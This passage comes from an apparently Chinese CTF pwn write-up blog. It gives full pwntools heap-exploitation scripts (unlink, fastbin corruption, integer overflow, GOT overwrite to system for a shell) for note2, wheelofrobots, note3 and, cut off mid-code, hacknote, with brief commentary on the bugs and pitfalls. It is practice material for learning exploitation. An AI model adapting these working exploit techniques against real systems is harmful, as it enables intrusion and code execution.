class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">note2 = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">ptr0=<span class="number">0x602120</span></span><br><span class="line">content=p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)+p64(ptr0-<span class="number">0x18</span>)+p64(ptr0-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x60</span>)  </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;address&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">newnote(<span class="number">0x80</span>,content)</span><br><span class="line">newnote(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">newnote(<span class="number">0x80</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">content=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(note2.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,content)</span><br><span class="line"></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">atoi_addr=u64(atoi_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_base=atoi_addr-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">content = p64(system_addr)</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\bin\sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>注意点:</strong>strnat,strcpy这些函数结束判断都与’\0’有极大关系,故而相关填充时就不能随意填充0了,否则可能达不到我们需要的效果</p><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p><strong>难度:★★★</strong></p><p>难度更上一筹,对漏洞的发现能力要求更高</p><p>防护依然是canary和nx</p><p><strong>利用点1:</strong>读取选项的函数,读取5个字节,最后一个字节恰好能覆盖到bender的inuse状态位</p><p><strong>利用点2:</strong>在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出，但与此同时， <code>destructor_size = v5</code> 仍然会很大。</p><p>利用思路要更复杂,要记清楚各个指针的地址就不容易了,逻辑也要更清晰才行</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./wofr&quot;</span></span><br><span class="line">robots = ELF(<span class="string">&#x27;./wofr&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./wofr&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    p.recvuntilb(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;step 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># so it is in fastbin, idx2-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># idx2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow bender inuse with 1</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change bender&#x27;s fd to 0x603138, point to bender&#x27;s size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order add bender again</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># it is at Robot Devil</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># place fake chunk at destructor&#x27;s pointer</span></span><br><span class="line">    fakechunk_addr = <span class="number">0x6030E8</span></span><br><span class="line">    fakechunk = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(fakechunk_addr - <span class="number">0x18</span>) + p64(</span><br><span class="line">        fakechunk_addr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">    fakechunk = fakechunk.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    fakechunk += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">    change(<span class="number">6</span>, fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger unlink</span></span><br><span class="line">    remove(<span class="number">3</span>) <span class="comment">#unlink 6</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make 0x6030F8 point to 0x6030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="number">0x18</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make exit just as return</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;exit&#x27;</span>], <span class="number">0x401954</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set wheel cnt =3, 0x603130 in order to start robot</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set destructor point to puts@got</span></span><br><span class="line">    change(<span class="number">1</span>, p64(robots.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;New hands great!! Thx &#x27;</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">b&#x27;!\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(robots.got[<span class="string">&#x27;free&#x27;</span>], system_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="2014ZCTF-note3"><a href="#2014ZCTF-note3" class="headerlink" title="2014ZCTF note3"></a>2014ZCTF note3</h2><p><strong>难度:★★</strong></p><p>难度和前几题差不多,<strong>但有一个大坑!!</strong></p><p><strong>利用点1:</strong>如果size输入0,会存在一个无符号整型与有符号整型的比较,造成整数溢出,几乎可以无限输入</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:(less than 1024)\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27; content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;id of the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Delete success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;the note:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;new content:\n&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;Edit success\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">chunk0_ptr_addr=<span class="number">0x6020C8</span></span><br><span class="line">newnote(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">newnote(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(chunk0_ptr_addr-<span class="number">0x10</span>)+p64(chunk0_ptr_addr-<span class="number">0x8</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(sys_addr)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>说一下刚才提到的坑</strong>,就是程序自定义的输入函数,会将输入的最后一个字符的后一字节置为0或者遇到换行符将换行符置为0,这里是第二种情况</p><p>因此在写一个got表时,就会把这个got附近的got表给修改掉,从而使程序异常退出,被一脸懵逼地卡了好久</p><p>解决办法就是p64(elf.plt[‘puts’])[:-1]这样,只发送8个字节,且第八个字节被置为0,不影响本来的数据(高地址本来就是0),如果不这样的话相邻的got表的最低字节就会变成0</p><p><strong>说到底还是怪自己没注意sendline.</strong></p><p>另外还学到了伪造unlink后项chunk的方法,即通过后项的后项的size判断后项是否被使用,并以此绕过</p><h2 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training lab 10 hacknote"></a>HITCON-training lab 10 hacknote</h2><p><strong>难度:★</strong></p><p>防护nx和canary</p><p>利用点是UAF,delete函数只是free没有置0,意味着其他函数照样可以继续使用该chunk,但是其又可以被分配给新的note,这样我们就具有了修改一个可以被使用的note的头的能力</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntilb(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span 